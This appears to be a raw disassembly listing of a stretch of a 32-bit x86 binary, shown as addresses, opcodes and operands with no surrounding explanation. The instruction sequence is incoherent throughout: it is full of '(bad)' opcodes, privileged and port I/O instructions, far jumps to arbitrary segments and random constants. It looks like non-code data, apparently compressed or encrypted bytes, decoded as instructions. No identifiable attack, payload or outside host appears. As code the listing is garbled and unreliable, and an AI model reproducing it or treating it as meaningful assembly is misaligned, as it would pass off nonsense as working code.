  40d5ea:	lds    edx,FWORD PTR [eax+ebx*1-0x227a9fa3]
  40d5f1:	test   eax,0xdf159c5e
  40d5f6:	pop    ds
  40d5f7:	and    DWORD PTR [edi+ecx*8+0x3158d304],0x14de5398
  40d602:	jle    0x40d63e
  40d604:	xor    eax,0x848cb12
  40d609:	sbb    BYTE PTR gs:[esi],al
  40d60c:	ffreep st(2)
  40d60e:	je     0x40d688
  40d610:	jno    0x40d624
  40d612:	dec    esp
  40d613:	xchg   edx,eax
  40d614:	(bad)  
  40d615:	cmp    DWORD PTR [esp+ebp*4+0x3cab250a],ecx
  40d61c:	or     DWORD PTR [edi+0x57ec2fb8],esp
  40d622:	(bad)  
  40d623:	imul   BYTE PTR [esi]
  40d625:	rcl    BYTE PTR [edx+edx*2],cl
  40d628:	cmp    al,0xc4
  40d62a:	je     0x40d69e
  40d62c:	add    al,dh
  40d62e:	ret    0x8d89
  40d631:	pop    ds
  40d632:	dec    ebp
  40d633:	mov    ch,0xa1
  40d635:	push   ebx
  40d636:	daa    
  40d637:	imul   esp
  40d639:	mov    al,ds:0xe993ea09
  40d63e:	and    esi,DWORD PTR [eax]
  40d640:	xchg   dh,dh
  40d642:	jae    0x40d679
  40d644:	hlt    
  40d645:	retf   0x10e0
  40d648:	sbb    al,bh
  40d64a:	add    DWORD PTR [esi-0x74],eax
  40d64d:	add    bl,ch
  40d64f:	add    ebx,DWORD PTR [edx+0x52a90a29]
  40d655:	sbb    al,0x61
  40d657:	mov    dl,0xac
  40d659:	or     edi,edx
  40d65b:	push   esi
  40d65c:	jno    0x40d692
  40d65e:	addr16 pop esi
  40d660:	mov    dh,0x6e
  40d662:	lds    esi,FWORD PTR [eax+0x40049106]
  40d668:	in     eax,dx
  40d669:	test   al,0xab
  40d66b:	mov    ds:0x2b0f81b5,eax
  40d670:	fisub  DWORD PTR [ebx+eax*2+0x612337ce]
  40d677:	mov    eax,0x6e8edc0a
  40d67c:	loope  0x40d65b
  40d67e:	xor    DWORD PTR [esi-0x4f3d7b1f],0x8e6a5dd1
  40d688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d689:	and    edx,DWORD PTR [ebx-0x5d58a94b]
  40d68f:	fmul   st,st(1)
  40d691:	and    edi,esi
  40d693:	int    0x62
  40d695:	jno    0x40d67d
  40d697:	arpl   WORD PTR [ebx],bp
  40d699:	ret    
  40d69a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d69b:	push   ds
  40d69c:	aam    0x43
  40d69e:	outs   dx,BYTE PTR cs:[esi]
  40d6a0:	mov    al,0xad
  40d6a2:	imul   esi,DWORD PTR [esi-0x179f9ee9],0x27b16622
  40d6ac:	mov    al,ds:0x6be2c202
  40d6b1:	call   0x5c7a6c59
  40d6b6:	xor    esp,DWORD PTR [ebp+0x4f]
  40d6b9:	mov    esp,0xf4239570
  40d6be:	add    al,0x61
  40d6c0:	jbe    0x40d6b5
  40d6c2:	add    BYTE PTR [edi+edx*1+0x6bfdde8f],al
  40d6c9:	popf   
  40d6ca:	lods   eax,DWORD PTR ds:[esi]
  40d6cb:	add    esp,edi
  40d6cd:	push   0x1b216cba
  40d6d2:	sbb    eax,0x85befeec
  40d6d7:	pushf  
  40d6d8:	adc    bh,ch
  40d6da:	scas   al,BYTE PTR es:[edi]
  40d6db:	inc    edi
  40d6dc:	mov    ch,0xa8
  40d6de:	pop    ds
  40d6df:	push   0x63
  40d6e1:	sbb    eax,0xfcc12c30
  40d6e6:	(bad)  
  40d6e7:	bound  edx,QWORD PTR [ebx]
  40d6e9:	jmp    0x40d684
  40d6eb:	imul   ebx,DWORD PTR [eax-0x5],0xffffffba
  40d6ef:	jno    0x40d6e1
  40d6f1:	xor    eax,0x7be83559
  40d6f6:	cmp    cl,BYTE PTR [edi+edi*2-0x2]
  40d6fa:	test   DWORD PTR [edi],0x8a963762
  40d700:	and    BYTE PTR [ebx+0x1],cl
  40d703:	dec    BYTE PTR [eax]
  40d705:	test   al,0xa3
  40d707:	xor    edx,DWORD PTR [eax-0x70]
  40d70a:	outs   dx,BYTE PTR ds:[esi]
  40d70b:	sub    cl,dh
  40d70d:	rcr    DWORD PTR [ebx-0xdec1da8],0xf3
  40d714:	sub    al,0x18
  40d716:	js     0x40d792
  40d718:	adc    BYTE PTR ds:0x3d1c6c63,0xdb
  40d71f:	call   0xddd2:0x3f9c9d3b
  40d726:	(bad)  
  40d727:	push   ebp
  40d728:	(bad)  
  40d729:	cmp    DWORD PTR [edx+ecx*2],ecx
  40d72c:	daa    
  40d72d:	iret   
  40d72e:	je     0x40d713
  40d730:	add    BYTE PTR [ebp-0x9],0x47
  40d734:	ds ja  0x40d75c
  40d737:	jno    0x40d79b
  40d739:	pop    ecx
  40d73a:	cmc    
  40d73b:	sar    BYTE PTR [esi-0x11],0x6
  40d73f:	cmc    
  40d740:	pop    esi
  40d741:	jg     0x40d708
  40d743:	inc    edx
  40d744:	mov    al,0xb9
  40d746:	into   
  40d747:	push   edi
  40d748:	sub    DWORD PTR [edi],0xa662d5c6
  40d74e:	cmc    
  40d74f:	xchg   DWORD PTR [ecx],ecx
  40d751:	lea    eax,[eax+0x50b5d63d]
  40d757:	cmp    edi,DWORD PTR [ebx-0x18]
  40d75a:	inc    ebx
  40d75b:	adc    eax,0xa648214e
  40d760:	popa   
  40d761:	and    BYTE PTR [ebp+0x85912e2],ah
  40d767:	jmp    0x40d724
  40d769:	inc    edi
  40d76a:	push   es
  40d76b:	sub    al,0xdf
  40d76d:	les    edx,FWORD PTR [ebp+0x4175305]
  40d773:	imul   edx,DWORD PTR ds:0x55f3e6a6,0xffffffbd
  40d77a:	jp     0x40d79a
  40d77c:	push   ecx
  40d77d:	fadd   DWORD PTR [ecx]
  40d77f:	and    dl,cl
  40d781:	popf   
  40d782:	inc    edi
  40d783:	sahf   
  40d784:	(bad)  
  40d785:	sahf   
  40d786:	icebp  
  40d787:	idiv   BYTE PTR gs:[ecx]
  40d78a:	mov    ah,0x6c
  40d78c:	pop    es
  40d78d:	mov    ds:0x267b127b,al
  40d792:	stos   DWORD PTR es:[edi],eax
  40d793:	stos   DWORD PTR es:[edi],eax
  40d794:	xchg   edx,eax
  40d795:	in     eax,0xd4
  40d797:	adc    eax,0x93133d75
  40d79c:	xchg   esi,eax
  40d79d:	ins    BYTE PTR es:[edi],dx
  40d79e:	cmp    al,0x80
  40d7a0:	xor    al,0x53
  40d7a2:	jmp    0x84eb5635
  40d7a7:	(bad)  
  40d7a8:	imul   esi,eax,0xe
  40d7ab:	mov    ch,BYTE PTR [ecx-0x5c4f5f73]
  40d7b1:	ror    DWORD PTR [ebp+esi*8-0x7a],cl
  40d7b5:	into   
  40d7b6:	add    al,0x21
  40d7b8:	sub    esi,ebx
  40d7ba:	xlat   BYTE PTR ds:[ebx]
  40d7bb:	daa    
  40d7bc:	and    al,0xa7
  40d7be:	mov    ds:0x65d27ccd,eax
  40d7c3:	push   ds
  40d7c4:	scas   eax,DWORD PTR es:[edi]
  40d7c5:	dec    eax
  40d7c6:	outs   dx,DWORD PTR ds:[esi]
  40d7c7:	cmp    DWORD PTR [edi+0x2de5b9e9],edx
  40d7cd:	cmp    dl,BYTE PTR [ebp-0x5c]
  40d7d0:	adc    BYTE PTR [ecx-0x3ce3f561],0x99
  40d7d7:	stos   DWORD PTR es:[edi],eax
  40d7d8:	pop    ss
  40d7d9:	xor    dh,al
  40d7db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7dc:	mov    esp,0xd2f9853d
  40d7e1:	xchg   ecx,eax
  40d7e2:	sub    DWORD PTR [ecx],edx
  40d7e4:	xchg   esp,eax
  40d7e5:	sub    cl,BYTE PTR [edi+ecx*4]
  40d7e8:	and    DWORD PTR [eax+0x40],0x784f5260
  40d7ef:	jecxz  0x40d81c
  40d7f1:	and    eax,0xab0047a2
  40d7f6:	inc    ecx
  40d7f7:	pop    ss
  40d7f8:	and    DWORD PTR [edx],esp
  40d7fa:	ja     0x40d817
  40d7fc:	sub    DWORD PTR [ecx-0x53],ecx
  40d7ff:	push   edi
  40d800:	jecxz  0x40d85e
  40d802:	sub    esi,edx
  40d804:	jl     0x40d86d
  40d806:	jnp    0x40d823
  40d808:	bound  edx,QWORD PTR [eax+edi*2]
  40d80b:	outs   dx,DWORD PTR ds:[esi]
  40d80c:	inc    eax
  40d80d:	xchg   ecx,eax
  40d80e:	or     eax,0x68c5cc25
  40d813:	lods   eax,DWORD PTR ds:[esi]
  40d814:	add    dl,ch
  40d816:	pop    ebp
  40d817:	fdiv   QWORD PTR [eax-0x35]
  40d81a:	jle    0x40d803
  40d81c:	mov    al,ds:0x7873661c
  40d821:	ficom  WORD PTR [eax]
  40d823:	mov    ebx,DWORD PTR ss:[di]
  40d827:	daa    
  40d828:	int3   
  40d829:	int    0xc0
  40d82b:	or     BYTE PTR [edi-0x4d8173dc],bh
  40d831:	add    eax,0x7d592908
  40d836:	inc    ebp
  40d837:	sbb    DWORD PTR [ebx-0x5a6e7080],edi
  40d83d:	sub    eax,0xfc7d4064
  40d842:	push   ss
  40d843:	mov    BYTE PTR [esi+0x41e9959a],ah
  40d849:	data16 sub al,0xda
  40d84c:	stc    
  40d84d:	jecxz  0x40d8b7
  40d84f:	cld    
  40d850:	cmp    DWORD PTR [esi],0x42
  40d853:	xchg   edx,eax
  40d854:	cli    
  40d855:	shl    BYTE PTR [edx-0x76573f4],cl
  40d85b:	mov    WORD PTR [esi+0x7],fs
  40d85e:	lods   eax,DWORD PTR ds:[esi]
  40d85f:	in     eax,0x79
  40d861:	cmc    
  40d862:	ds mov dl,0x65
  40d865:	hlt    
  40d866:	fcom   QWORD PTR [ebp-0x7d]
  40d869:	jmp    0x40d885
  40d86b:	stos   DWORD PTR es:[edi],eax
  40d86c:	add    bl,ah
  40d86e:	cmp    BYTE PTR [ecx+eax*1+0x77caa51a],al
  40d875:	mov    BYTE PTR [eax+0x6ef85ca2],dh
  40d87b:	ret    
  40d87c:	fld    DWORD PTR [ebx]
  40d87e:	xor    eax,0x1b522f9f
  40d883:	mov    eax,0xe7b6bda3
  40d888:	daa    
  40d889:	and    al,0x97
  40d88b:	mov    esi,0x1e361967
  40d890:	popf   
  40d891:	or     DWORD PTR [ebx+0x7f],ecx
  40d894:	dec    ebx
  40d895:	adc    eax,0xf9437f2
  40d89a:	mov    esp,eax
  40d89c:	inc    ecx
  40d89d:	repnz lock popf 
  40d8a0:	mov    ah,0xb2
  40d8a2:	fsin   
  40d8a4:	fimul  DWORD PTR [esi-0x69]
  40d8a7:	and    DWORD PTR [ebx+ecx*8-0x23cd987],ebx
  40d8ae:	int    0xbc
  40d8b0:	cmp    eax,eax
  40d8b2:	pop    ebp
  40d8b3:	(bad)  
  40d8b4:	push   esi
  40d8b5:	xchg   BYTE PTR [ebx+esi*8+0x25],dl
  40d8b9:	cmp    DWORD PTR [ebx+0x28],ebp
  40d8bc:	mov    ds:0x71b71d69,eax
  40d8c1:	inc    ebp
  40d8c2:	popf   
  40d8c3:	ror    BYTE PTR [edi-0x42],cl
  40d8c6:	mov    WORD PTR [ebp-0x6d75671a],?
  40d8cc:	cmp    DWORD PTR ds:0x3b9a69a3,ebx
  40d8d2:	sub    bl,BYTE PTR es:[eax+0x7]
  40d8d6:	sahf   
  40d8d7:	xlat   BYTE PTR ds:[ebx]
  40d8d8:	(bad)  
  40d8d9:	int3   
  40d8da:	xor    DWORD PTR [ebx+0x137e0744],esp
  40d8e0:	retf   
  40d8e1:	shl    BYTE PTR [esi+0xd74090c],0xb9
  40d8e8:	in     al,0xae
  40d8ea:	ror    BYTE PTR [edi+0x44d5022],0xf5
  40d8f1:	mov    al,ds:0xa9f5aa09
  40d8f6:	ins    BYTE PTR es:[edi],dx
  40d8f7:	neg    DWORD PTR [ebx+0x59db9856]
  40d8fd:	or     eax,0x2f202b44
  40d902:	xchg   DWORD PTR [eax+0x2d03f4c9],ebp
  40d908:	(bad)  
  40d909:	repz jne 0x40d908
  40d90c:	xchg   edx,eax
  40d90d:	pop    eax
  40d90e:	push   0x3e9fc828
  40d913:	adc    ecx,DWORD PTR [ebp-0x63]
  40d916:	mov    ecx,0x751e70cc
  40d91b:	mov    ebp,0xce6a1ba2
  40d920:	push   edi
  40d921:	ds jmp 0x1393:0x7168b678
  40d929:	test   DWORD PTR [eax+0x6d0ce788],ebp
  40d92f:	xor    eax,0xf3af4325
  40d934:	addr16 lock push esi
  40d937:	or     esp,DWORD PTR [ebp+ecx*2-0x4105cede]
  40d93e:	or     ebp,esp
  40d940:	cmp    DWORD PTR [edi+0x24],0xffffffc9
  40d944:	cdq    
  40d945:	hlt    
  40d946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d947:	and    esp,0x47304721
  40d94d:	dec    esp
  40d94e:	(bad)  
  40d94f:	sbb    BYTE PTR [ebx+0x512a5dbe],cl
  40d955:	mov    ch,0xe0
  40d957:	sahf   
  40d958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d959:	dec    eax
  40d95a:	popf   
  40d95b:	xchg   BYTE PTR [esi],ah
  40d95d:	es sbb eax,0xae4033f1
  40d963:	and    al,0x27
  40d965:	and    bh,BYTE PTR [ebx]
  40d967:	or     BYTE PTR [edx+eiz*8-0x75f03e71],dl
  40d96e:	xchg   dl,dh
  40d970:	jmp    0xb863:0x612f07eb
  40d977:	inc    ebx
  40d978:	hlt    
  40d979:	push   cs
  40d97a:	pop    esi
  40d97b:	mov    edx,0xd105997a
  40d980:	int    0xec
  40d982:	aas    
  40d983:	adc    eax,eax
  40d985:	xchg   edx,eax
  40d986:	fild   QWORD PTR [ebx+0x5ef4b8c8]
  40d98c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d98d:	mov    es,esp
  40d98f:	xor    BYTE PTR [ecx+0x3d],bh
  40d992:	div    DWORD PTR [edi+ebx*2+0x6f]
  40d996:	sar    dh,0x5a
  40d999:	test   DWORD PTR [esi],eax
  40d99b:	push   es
  40d99c:	mov    ch,0x92
  40d99e:	xchg   esi,eax
  40d99f:	or     BYTE PTR [esp+edi*8+0x7c],bl
  40d9a3:	pop    esi
  40d9a4:	mov    DWORD PTR [eax],ebp
  40d9a6:	inc    esp
  40d9a7:	push   edx
  40d9a8:	daa    
  40d9a9:	nop
  40d9aa:	push   0x196f5f72
  40d9af:	std    
  40d9b0:	retf   
  40d9b1:	mov    cs,esp
  40d9b3:	gs inc eax
  40d9b5:	(bad)  
  40d9b7:	add    eax,0x9f471e40
  40d9bc:	sbb    esp,DWORD PTR [ecx+edx*4+0x76]
  40d9c0:	add    BYTE PTR ds:[esp+esi*8-0x586ff3f3],ch
  40d9c8:	leave  
  40d9c9:	and    BYTE PTR [esi-0x2e033059],bh
  40d9cf:	xlat   BYTE PTR ds:[ebx]
  40d9d0:	and    eax,0x63c1eef9
  40d9d5:	out    dx,al
  40d9d6:	push   ecx
  40d9d7:	(bad)  
  40d9d8:	bndldx (bad),[ebp+eax*1+0x6cbc7fc]
  40d9e0:	rcl    DWORD PTR [esi],cl
  40d9e2:	push   esp
  40d9e3:	rcl    DWORD PTR [eax-0x1727a0c6],0x39
  40d9ea:	lea    esi,[ebp+0x69]
  40d9ed:	xchg   ebx,eax
  40d9ee:	out    dx,eax
  40d9ef:	pop    ebx
  40d9f0:	mov    BYTE PTR [eax+edi*1+0x954bdc3],bh
  40d9f7:	(bad)  
  40d9f8:	mov    edi,0x8b3cb68f
  40d9fd:	aas    
  40d9fe:	leave  
  40d9ff:	jl     0x40da74
  40da01:	jo     0x40da3f
  40da03:	adc    ebp,ebx
  40da05:	sbb    eax,0x2efcea5c
  40da0a:	aad    0x58
  40da0c:	aas    
  40da0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da0e:	pushf  
  40da0f:	arpl   WORD PTR [ecx+edx*4+0x68042f5c],bp
  40da16:	jns    0x40da19
  40da18:	mov    ds:0xf1b60a4d,ax
  40da1e:	xor    eax,0xf2e1ebf7
  40da23:	dec    esp
  40da24:	stos   DWORD PTR es:[edi],eax
  40da25:	repnz mov al,ds:0x99cf7e54
  40da2b:	imul   DWORD PTR ds:0x8ec567b8
  40da31:	jmp    0xbe36:0xb8e93583
  40da38:	js     0x40da1c
  40da3a:	push   esp
  40da3b:	sbb    DWORD PTR [eax],edx
  40da3d:	loop   0x40d9f9
  40da3f:	cdq    
  40da40:	xchg   ecx,eax
  40da41:	and    al,0x3e
  40da43:	sbb    DWORD PTR [esi+ebp*8-0x77],esi
  40da47:	ror    DWORD PTR [edi+0x6cb32],cl
  40da4d:	jmp    0xdf222932
  40da52:	jbe    0x40d9d7
  40da54:	in     eax,0x35
  40da56:	dec    esi
  40da57:	push   0x33
  40da59:	aas    
  40da5a:	jae    0x40daa4
  40da5c:	out    0xa3,al
  40da5e:	outs   dx,DWORD PTR ds:[esi]
  40da5f:	lea    eax,[ecx+0x6b4be5e0]
  40da65:	sbb    DWORD PTR [ecx-0x6a6d30a0],ebp
  40da6b:	or     DWORD PTR [ebx+0x70],0xffffffde
  40da6f:	xor    eax,0x58b0551c
  40da74:	mov    esi,0xf6845d6
  40da79:	mov    cl,0xee
  40da7b:	fmulp  st(0),st
  40da7d:	xchg   ebp,eax
  40da7e:	pop    ebx
  40da7f:	pop    ss
  40da80:	int    0xf3
  40da82:	sub    ecx,DWORD PTR [edi+0x40]
  40da85:	xor    ebx,DWORD PTR ds:0x5f87f268
  40da8b:	(bad)  
  40da8c:	jo     0x40dac5
  40da8e:	mov    eax,0x199ec576
  40da93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da94:	sbb    eax,0x6b5f0e25
  40da99:	repz mov dh,0xf1
  40da9c:	loop   0x40da73
  40da9e:	add    al,0x14
  40daa0:	pop    ds
  40daa1:	lods   al,BYTE PTR ds:[esi]
  40daa2:	ds lock dec ecx
  40daa5:	(bad)
  40daa8:	inc    eax
  40daa9:	xchg   edx,eax
  40daaa:	push   ebp
  40daab:	sbb    esi,ebp
  40daad:	rol    BYTE PTR [edi+0x34],1
  40dab0:	call   DWORD PTR [eax]
  40dab2:	dec    edi
  40dab3:	pop    ss
  40dab4:	shr    esp,0x96
  40dab7:	(bad)  
  40dab8:	aas    
  40dab9:	arpl   WORD PTR [eax+ecx*4+0x2878cc4c],bp
  40dac0:	push   esi
  40dac1:	mov    eax,0xddb71eb3
  40dac6:	dec    ecx
  40dac7:	mov    eax,0x983a88df
  40dacc:	dec    eax
  40dacd:	jo     0x40dacd
  40dacf:	int3   
  40dad0:	sbb    bh,ch
  40dad2:	lods   eax,DWORD PTR ds:[esi]
  40dad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dad4:	movnti DWORD PTR ss:[ebx-0x4e542be2],edx
  40dadc:	retf   
  40dadd:	xchg   edx,eax
  40dade:	lods   eax,DWORD PTR ds:[esi]
  40dadf:	sar    DWORD PTR [edx+0xc335914],1
  40dae5:	fs cdq 
  40dae7:	js     0x40da7c
  40dae9:	mov    eax,ds:0x930d26eb
  40daee:	sub    eax,0xcb8272ee
  40daf3:	int    0xbc
  40daf5:	(bad)  
  40daf6:	retf   
  40daf7:	dec    edx
  40daf8:	(bad)  
  40dafa:	ds xchg esp,eax
  40dafc:	or     ebx,DWORD PTR [ebx]
  40dafe:	inc    eax
  40daff:	xchg   ebp,eax
  40db00:	inc    ebp
  40db01:	retf   
  40db02:	pop    ebp
  40db03:	mov    al,ds:0xa72d4cbe
  40db08:	xchg   ebp,eax
  40db09:	jb     0x40db06
  40db0b:	jae    0x40db31
  40db0d:	mov    edx,0x9bf2bd31
  40db12:	add    esi,edx
  40db14:	mov    ebp,0x8ce59352
  40db19:	rcl    ebp,0xa8
  40db1c:	retf   
  40db1d:	mov    eax,0x874e4102
  40db22:	sub    DWORD PTR [ecx+esi*4-0x10],eax
  40db26:	push   es
  40db27:	sub    BYTE PTR [eax-0x2513f3ac],0x1b
  40db2e:	call   0xdcf6:0x8d490bff
  40db35:	addr16 xchg ebx,eax
  40db37:	call   0x51191e6b
  40db3c:	cli    
  40db3d:	ss int 0x6f
  40db40:	and    DWORD PTR [ecx],esp
  40db42:	adc    al,0x8e
  40db44:	out    dx,eax
  40db45:	or     DWORD PTR [ecx+edi*8-0x39],ebx
  40db49:	hlt    
  40db4a:	xor    BYTE PTR [edi+0x71470d1c],ch
  40db50:	rcl    BYTE PTR ds:0x77444d0e,1
  40db56:	pop    esi
  40db57:	(bad)  
  40db58:	ds fmul st(4),st
  40db5b:	loopne 0x40dbb5
  40db5d:	jecxz  0x40daf9
  40db5f:	inc    esp
  40db60:	gs and eax,0xece4f77e
  40db66:	outs   dx,BYTE PTR ds:[esi]
  40db67:	mov    esp,ebx
  40db69:	rol    BYTE PTR ds:[edi-0x66],1
  40db6d:	add    bl,ch
  40db6f:	push   es
  40db70:	adc    eax,0xb20a73cc
  40db75:	jnp    0x40dbe4
  40db77:	push   ss
  40db78:	test   eax,0xaa44d790
  40db7d:	inc    edx
  40db7e:	or     esp,edi
  40db80:	inc    esp
  40db81:	mov    eax,0xfbc8915
  40db86:	sbb    esi,DWORD PTR [edx]
  40db88:	mov    ebp,0x5c7ee5f0
  40db8d:	and    al,0xa1
  40db8f:	or     BYTE PTR [edx],dl
  40db91:	les    esp,FWORD PTR [ebp+0x1c]
  40db94:	jno    0x40dbeb
  40db96:	or     esp,ebx
  40db98:	out    dx,eax
  40db99:	push   edx
  40db9a:	dec    esi
  40db9b:	mov    edx,0xbd8f1db8
  40dba0:	lds    esi,FWORD PTR [ebp+0x4d79fd07]
  40dba6:	and    al,0x3e
  40dba8:	mov    ds:0xff71d032,al
  40dbad:	adc    DWORD PTR [edi-0x7b],0x75
  40dbb1:	rcr    DWORD PTR [ebx],0xbc
  40dbb4:	pop    es
  40dbb5:	xchg   esi,eax
  40dbb6:	ret    
  40dbb7:	mov    cl,0xdb
  40dbb9:	pop    esp
  40dbba:	test   al,0x29
  40dbbc:	cwde   
  40dbbd:	mov    edi,0xc95be9a4
  40dbc2:	inc    edx
  40dbc3:	shl    BYTE PTR [edi-0x3f],cl
  40dbc6:	add    al,0xe3
  40dbc8:	into   
  40dbc9:	pushf  
  40dbca:	fdiv   DWORD PTR [eax-0x221a84bb]
  40dbd0:	lds    ebp,FWORD PTR [eax-0xd70715f]
  40dbd6:	inc    esi
  40dbd7:	out    dx,al
  40dbd8:	ja     0x40dc2e
  40dbda:	mov    ah,0xd7
  40dbdc:	mov    cl,0x92
  40dbde:	in     eax,0x99
  40dbe0:	inc    esi
  40dbe1:	call   0x2271:0x6d85242c
  40dbe8:	aam    0xf2
  40dbea:	test   DWORD PTR [ecx-0x7c],edx
  40dbed:	jo     0x40dc34
  40dbef:	imul   esp,DWORD PTR [ecx],0xf
  40dbf2:	add    DWORD PTR [edi+0x36c5efd4],esp
  40dbf8:	push   ss
  40dbf9:	jnp    0x40dbb8
  40dbfb:	adc    DWORD PTR [edi+0x4c],0x11b065f2
  40dc02:	leave  
  40dc03:	outs   dx,DWORD PTR ds:[esi]
  40dc04:	retf   
  40dc05:	dec    ebp
  40dc06:	mov    edx,0x40aa18a2
  40dc0b:	es lock add ah,ch
  40dc0f:	lds    esp,FWORD PTR [edi-0x22]
  40dc12:	fs jecxz 0x40dba4
  40dc15:	jo     0x40dc47
  40dc17:	(bad)  
  40dc18:	shl    DWORD PTR ds:0x42cc384a,cl
  40dc1e:	iret   
  40dc1f:	push   ebx
  40dc20:	push   edx
  40dc21:	out    dx,eax
  40dc22:	mov    bl,0x5f
  40dc24:	pop    edx
  40dc25:	popf   
  40dc26:	mov    ebp,0x18c4bdab
  40dc2b:	mov    esp,0xabb9f6a
  40dc30:	xor    bl,BYTE PTR [edx+eiz*2+0x36fabbfa]
  40dc37:	sub    ecx,DWORD PTR gs:[edi]
  40dc3a:	test   DWORD PTR [edi-0x6e],0xb2f53ae4
  40dc41:	jmp    0x40dbdc
  40dc43:	in     eax,dx
  40dc44:	mov    BYTE PTR [esi],ah
  40dc46:	push   ss
  40dc47:	jnp    0x40dc80
  40dc49:	xor    eax,0x56548bb4
  40dc4e:	jb     0x40dc95
  40dc50:	xor    eax,0xafde4cf4
  40dc55:	repz mov WORD PTR [ebp+eiz*4+0x2e8b8ad6],?
  40dc5d:	test   DWORD PTR [edi+0xe],esp
  40dc60:	sbb    BYTE PTR [edi-0x728e9678],0x7d
  40dc67:	push   esi
  40dc68:	stos   BYTE PTR es:[edi],al
  40dc69:	adc    eax,0x50f64de3
  40dc6e:	imul   esp,ebx,0xffffff80
  40dc71:	or     edx,DWORD PTR [ebp+0x51]
  40dc74:	or     al,0xc8
  40dc76:	jle    0x40dc25
  40dc78:	sbb    ch,BYTE PTR [edx]
  40dc7a:	popa   
  40dc7b:	mov    esp,0x1e5aac28
  40dc80:	or     DWORD PTR [ecx],eax
  40dc82:	push   esi
  40dc83:	jmp    0x40dc4b
  40dc85:	cdq    
  40dc86:	rcl    bh,1
  40dc88:	cmp    bh,bl
  40dc8a:	(bad)
  40dc8d:	pop    es
  40dc8e:	or     al,0xe6
  40dc90:	fs adc eax,0x97147db4
  40dc96:	jnp    0x40dce2
  40dc98:	rol    BYTE PTR [esi],cl
  40dc9a:	push   esi
  40dc9b:	xchg   BYTE PTR [ebx],bh
  40dc9d:	push   cs
  40dc9e:	xchg   ecx,eax
  40dc9f:	cmp    bh,BYTE PTR [edx+0x25efc0bd]
  40dca5:	cmp    bl,dh
  40dca7:	ja     0x40dce6
  40dca9:	mov    WORD PTR [ebx+0x27],?
  40dcac:	inc    eax
  40dcad:	sbb    dh,BYTE PTR [esi+0x21]
  40dcb0:	pop    ss
  40dcb1:	lock call 0xefcd:0x23fefc75
  40dcb9:	sti    
  40dcba:	xor    al,0x32
  40dcbc:	cmp    BYTE PTR [ebx-0x4f78bb4c],dh
  40dcc2:	cdq    
  40dcc3:	sti    
  40dcc4:	mov    edx,0x727c0dec
  40dcc9:	xchg   cl,ah
  40dccb:	jp     0x40dcd7
  40dccd:	fadd   DWORD PTR [ecx]
  40dccf:	test   dh,al
  40dcd1:	and    al,0xb2
  40dcd3:	jmp    0x314e:0x9364f55b
  40dcda:	test   al,0x5f
  40dcdc:	pop    edi
  40dcdd:	mov    ?,WORD PTR [ebp+0x2]
  40dce0:	or     al,0xae
  40dce2:	(bad)  
  40dce3:	jecxz  0x40dcd6
  40dce5:	stos   DWORD PTR es:[edi],eax
  40dce6:	icebp  
  40dce7:	ins    BYTE PTR es:[edi],dx
  40dce8:	pop    edi
  40dce9:	adc    DWORD PTR [ebx+0x2d],ebx
  40dcec:	test   al,0xa2
  40dcee:	loopne 0x40dd6a
  40dcf0:	mov    ebx,esi
  40dcf2:	call   0xd121c082
  40dcf7:	(bad)  
  40dcf8:	fcmovu st,st(1)
  40dcfa:	jmp    0x40dcf2
  40dcfc:	cmp    BYTE PTR ds:0x86afb45b,ah
  40dd02:	cmp    BYTE PTR fs:[edx],bl
  40dd05:	or     al,0xbf
  40dd07:	ins    DWORD PTR es:[edi],dx
  40dd08:	ja     0x40dd23
  40dd0a:	mov    ah,0x98
  40dd0c:	push   0xfffffff2
  40dd0e:	mov    bh,0x5d
  40dd10:	std    
  40dd11:	mov    ecx,0xb8ec1fb8
  40dd16:	xchg   esi,eax
  40dd17:	fnstsw WORD PTR [edx]
  40dd19:	xchg   ebp,eax
  40dd1a:	inc    ebx
  40dd1b:	cmp    BYTE PTR [edi],dh
  40dd1d:	cmp    esi,0xffffffba
  40dd20:	sbb    DWORD PTR [eax-0x4ae8f898],0x5d
  40dd27:	pusha  
  40dd28:	mov    esp,0x57d1dd24
  40dd2d:	fwait
  40dd2e:	mov    ch,0x8a
  40dd30:	adc    bh,0x4b
  40dd33:	enter  0xe737,0xe8
  40dd37:	jle    0x40dce1
  40dd39:	or     dh,0xc7
  40dd3c:	lahf   
  40dd3d:	popf   
  40dd3e:	in     eax,dx
  40dd3f:	sbb    edi,eax
  40dd41:	add    al,0xb4
  40dd43:	sub    dh,bl
  40dd45:	and    cl,dh
  40dd47:	lods   eax,DWORD PTR ds:[esi]
  40dd48:	std    
  40dd49:	jle    0x40dd90
  40dd4b:	pop    esp
  40dd4c:	fiadd  WORD PTR [ebx+0x29]
  40dd4f:	(bad)  
  40dd51:	fs mov bh,0x97
  40dd54:	stos   DWORD PTR es:[edi],eax
  40dd55:	das    
  40dd56:	imul   edi,DWORD PTR [esi],0xffffffa4
  40dd59:	ffreep st(2)
  40dd5b:	repnz push edx
  40dd5d:	cdq    
  40dd5e:	dec    ebp
  40dd5f:	push   eax
  40dd60:	add    eax,0xbb3de2f9
  40dd65:	pop    edi
  40dd66:	fcom   QWORD PTR [esi-0x16eb1847]
  40dd6c:	inc    edx
  40dd6d:	imul   eax,ebx,0x61d5962b
  40dd73:	jecxz  0x40dd56
  40dd75:	scas   al,BYTE PTR es:[edi]
  40dd76:	cwde   
  40dd77:	adc    al,0x42
  40dd79:	push   ds
  40dd7a:	imul   ebp,DWORD PTR [edx+ebx*4],0x88b4a6b9
  40dd81:	pop    ebp
  40dd82:	xor    eax,0x7a28df4f
  40dd87:	loop   0x40dd0d
  40dd89:	sub    esi,eax
  40dd8b:	cld    
  40dd8c:	mov    bh,0x0
  40dd8e:	cmp    BYTE PTR [ebp-0x15b9ff44],dh
  40dd94:	adc    BYTE PTR [ecx+0x21],dl
  40dd97:	loop   0x40de02
  40dd99:	push   esi
  40dd9a:	loop   0x40dd97
  40dd9c:	lock leave 
  40dd9e:	cmc    
  40dd9f:	adc    cl,BYTE PTR [edi+0x4a1baca8]
  40dda5:	jnp    0x40dd83
  40dda7:	push   edi
  40dda8:	dec    eax
